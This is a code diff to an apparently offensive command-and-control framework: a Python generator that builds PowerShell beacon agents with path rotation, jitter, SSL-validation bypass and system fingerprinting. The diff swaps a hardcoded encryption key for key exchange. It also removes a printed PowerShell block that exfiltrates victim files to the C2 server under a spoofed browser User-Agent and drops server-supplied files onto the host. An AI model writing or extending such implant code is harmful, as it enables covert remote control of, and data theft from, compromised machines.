@@ -6,8 +6,8 @@ import importlib.util
 import shutil
 from pathlib import Path
 
-def generate_agent_code(key_base64, server_address, beacon_path="/beacon", cmd_result_path="/command_result", file_upload_path="/file_upload", rotation_info=None):
-    """Generate PowerShell agent code with identity collection and dynamic path rotation"""
+def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="/command_result", file_upload_path="/file_upload", rotation_info=None):
+    """Generate PowerShell agent code with secure key exchange and dynamic path rotation"""
     # Ensure all paths have leading slashes
     if not beacon_path.startswith('/'):
         beacon_path = '/' + beacon_path
@@ -35,11 +35,11 @@ def generate_agent_code(key_base64, server_address, beacon_path="/beacon", cmd_r
     
     # Generate the agent using the templates
     agent_code = generate_from_templates(
-        key_base64=key_base64,
         server_address=server_address,
         beacon_path=beacon_path,
         cmd_result_path=cmd_result_path,
         file_upload_path=file_upload_path,
+        file_request_path="/file_request",
         rotation_enabled=rotation_enabled,
         rotation_id=rotation_id,
         next_rotation_time=next_rotation,
@@ -95,26 +95,6 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         if not url_paths[key].startswith('/'):
             url_paths[key] = '/' + url_paths[key]
     
-    # Get the key information for documentation
-    keys_file = os.path.join(campaign_folder, "keys.json")
-    key_info = "Using campaign encryption key"
-    key_base64 = None
-    
-    if os.path.exists(keys_file):
-        try:
-            with open(keys_file, 'r') as f:
-                keys_data = json.load(f)
-                key_base64 = keys_data.get("primary")
-            key_info = f"Using encryption key from keys.json"
-        except Exception as e:
-            key_info = f"Warning: Error reading keys file: {e}"
-            key_base64 = None
-    
-    if not key_base64:
-        # Generate a random key if none exists
-        key = os.urandom(32)  # 256-bit key
-        key_base64 = base64.b64encode(key).decode('utf-8')
-    
     http = "https" if ssl else "http"
     server_address = f"{host}:{port}"
     
@@ -157,7 +137,6 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     
     # Generate agent code using templates
     agent_ps1 = generate_from_templates(
-        key_base64=key_base64,
         server_address=server_address,
         beacon_path=url_paths["beacon_path"],
         cmd_result_path=url_paths["cmd_result_path"],
@@ -206,7 +185,7 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     details = (
         f"Powershell Base64 Agent Details:\n"
         f"1. Base Command: {powershell_command}\n"
-        f"2. Encryption: {key_info}\n"
+        f"2. Encryption: Dynamic key exchange (no hardcoded key)\n"
         f"3. System Identification: Full system identification enabled\n"
         f"4. SSL Validation: {'Certificate validation bypassed (required for self-signed certs)' if ssl else 'No SSL used'}\n"
         f"5. Communication Paths:\n"
@@ -231,11 +210,11 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     with open(details_file_path, 'w') as f:
         f.write(details)
     
-    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
+    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: Dynamic key exchange (no hardcoded key)\nIdentity: Full system identification enabled"
     
     return f"Powershell Base64 agent generated and saved to {details_file_path}\n{result}"
 
-def generate_from_templates(key_base64, server_address, beacon_path, cmd_result_path, file_upload_path,
+def generate_from_templates(server_address, beacon_path, cmd_result_path, file_upload_path,
                            rotation_enabled, rotation_id, next_rotation_time, rotation_interval,
                            beacon_interval, jitter_percentage, max_failures, max_backoff, file_request_path="/file_request"):
     """Generate the PowerShell agent code from templates"""
@@ -271,192 +250,17 @@ def generate_from_templates(key_base64, server_address, beacon_path, cmd_result_
         path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
         path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", file_request_path)
     
-    # Add file operation functions to the agent template
-    file_operations_code = """
-# Function to download a file from client to server
-function Download-FileToServer {
-    param([string]$FilePath)
-    
-    Write-Host "Attempting to download file: $FilePath"
-    
-    if (-not (Test-Path -Path $FilePath)) {
-        return "Error: File not found - $FilePath"
-    }
-    
-    try {
-        # Get file info
-        $fileName = Split-Path -Path $FilePath -Leaf
-        $fileSize = (Get-Item $FilePath).Length
-        
-        # Read file as bytes and encode as Base64
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileContent = [System.Convert]::ToBase64String($fileBytes)
-        
-        # Create file info object
-        $fileInfo = @{
-            FileName = $fileName
-            FileSize = $fileSize
-            FilePath = $FilePath
-            FileContent = $fileContent
-        }
-        
-        # Convert to JSON
-        $fileInfoJson = ConvertTo-Json -InputObject $fileInfo -Compress
-        
-        # Encrypt the file data
-        $encryptedFileData = Encrypt-Data -PlainText $fileInfoJson
-        
-        # Get current file upload path
-        $uploadPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_upload_path" } else { $fileUploadPath }
-        $uploadUrl = "http://$serverAddress$uploadPath"
-        
-        # Create a web client
-        $uploadClient = New-Object System.Net.WebClient
-        $systemInfo = Get-SystemIdentification
-        $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
-        $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
-        
-        # Add headers
-        $uploadClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
-        $uploadClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
-        if ($global:pathRotationEnabled) {
-            $uploadClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
-        }
-        $uploadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-        $uploadClient.Headers.Add("Content-Type", "application/json")
-        
-        # Upload the file
-        $uploadClient.UploadString($uploadUrl, $encryptedFileData)
-        
-        # Return success message
-        return "$fileSize bytes from $FilePath downloaded to server"
-    }
-    catch {
-        return "Error downloading file: $_"
-    }
-}
-
-# Function to upload a file from server to client
-function Upload-FileFromServer {
-    param(
-        [string]$ServerFilePath,
-        [string]$ClientDestination
-    )
-    
-    Write-Host "Attempting to upload file from server: $ServerFilePath to $ClientDestination"
-    
-    try {
-        # Expand environment variables in destination path
-        $expandedDestination = [System.Environment]::ExpandEnvironmentVariables($ClientDestination)
-        
-        # Create the destination directory if it doesn't exist
-        $destinationDir = Split-Path -Path $expandedDestination -Parent
-        if (-not (Test-Path -Path $destinationDir)) {
-            New-Item -Path $destinationDir -ItemType Directory -Force | Out-Null
-        }
-        
-        # Send request to server to get the file
-        $fileRequestObj = @{
-            FilePath = $ServerFilePath
-            Destination = $expandedDestination
-        }
-        
-        $fileRequestJson = ConvertTo-Json -InputObject $fileRequestObj -Compress
-        $encryptedRequest = Encrypt-Data -PlainText $fileRequestJson
-        
-        # Get current file request path
-        $fileRequestPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_request_path" } else { "/file_request" }
-        $fileRequestUrl = "http://$serverAddress$fileRequestPath"
-        
-        # Create a web client
-        $requestClient = New-Object System.Net.WebClient
-        $systemInfo = Get-SystemIdentification
-        $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
-        $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
-        
-        # Add headers
-        $requestClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
-        $requestClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
-        if ($global:pathRotationEnabled) {
-            $requestClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
-        }
-        $requestClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
-        $requestClient.Headers.Add("Content-Type", "application/json")
-        
-        # Send the request and get the response
-        $encryptedResponse = $requestClient.UploadString($fileRequestUrl, $encryptedRequest)
-        $decryptedResponse = Decrypt-Data -EncryptedBase64 $encryptedResponse
-        
-        # Parse the response
-        $fileResponse = ConvertFrom-Json -InputObject $decryptedResponse
-        
-        if ($fileResponse.Status -eq "Error") {
-            return "Error from server: $($fileResponse.Message)"
-        }
-        
-        # Decode the file content
-        $fileBytes = [System.Convert]::FromBase64String($fileResponse.FileContent)
-        
-        # Save the file to destination
-        [System.IO.File]::WriteAllBytes($expandedDestination, $fileBytes)
-        
-        # Return success message
-        return "File uploaded from server to $expandedDestination ($([Math]::Round($fileBytes.Length / 1KB, 2)) KB)"
-    }
-    catch {
-        return "Error uploading file from server: $_"
-    }
-}
-"""
-
-    # Add file operation commands to the switch statement in Process-Commands
-    # Find the location in the template where we need to insert our code
-    command_handling_code = """
-            elseif ($commandType -eq "download") {
-                # Download file from client to server
-                $result = Download-FileToServer -FilePath $args
-            }
-            elseif ($commandType -eq "file_upload") {
-                # Upload file from server to client (format: "Upload-File 'LocalPath' 'RemotePath'")
-                $argParts = $args -split "' '"
-                $serverPath = $argParts[0].TrimStart("'")
-                $clientPath = $argParts[1].TrimEnd("'")
-                $result = Upload-FileFromServer -ServerFilePath $serverPath -ClientDestination $clientPath
-            }
-"""
-
-    # Insert the command handling code in the Process-Commands function
-    # We'll look for the "system_info" command handling section and insert after it
-    if "elseif ($commandType -eq \"system_info\")" in agent_template:
-        agent_template = agent_template.replace(
-            "elseif ($commandType -eq \"system_info\") {",
-            "elseif ($commandType -eq \"system_info\") {"
-        )
-        
-        # Find the closing brace of the system_info block and insert our code
-        system_info_index = agent_template.find("elseif ($commandType -eq \"system_info\")")
-        if system_info_index != -1:
-            closing_brace_index = agent_template.find("}", system_info_index)
-            if closing_brace_index != -1:
-                # Insert after the closing brace
-                agent_template = agent_template[:closing_brace_index+1] + command_handling_code + agent_template[closing_brace_index+1:]
-
     # Fill in the agent template with all values
     agent_code = agent_template
-    agent_code = agent_code.replace("{{KEY_BASE64}}", key_base64)
     agent_code = agent_code.replace("{{SERVER_ADDRESS}}", server_address)
     agent_code = agent_code.replace("{{BEACON_PATH}}", beacon_path)
     agent_code = agent_code.replace("{{CMD_RESULT_PATH}}", cmd_result_path)
     agent_code = agent_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
+    agent_code = agent_code.replace("{{FILE_REQUEST_PATH}}", file_request_path)
     agent_code = agent_code.replace("{{PATH_ROTATION_CODE}}", path_rotation_code)
     agent_code = agent_code.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
     agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
     agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
     agent_code = agent_code.replace("{{MAX_BACKOFF}}", str(max_backoff))
-    
-    # Add file operation functions to the end of the script, just before Start-AgentLoop is called
-    end_marker = "# Start the agent\nStart-AgentLoop"
-    if end_marker in agent_code:
-        agent_code = agent_code.replace(end_marker, file_operations_code + "\n\n" + end_marker)
     
     return agent_code
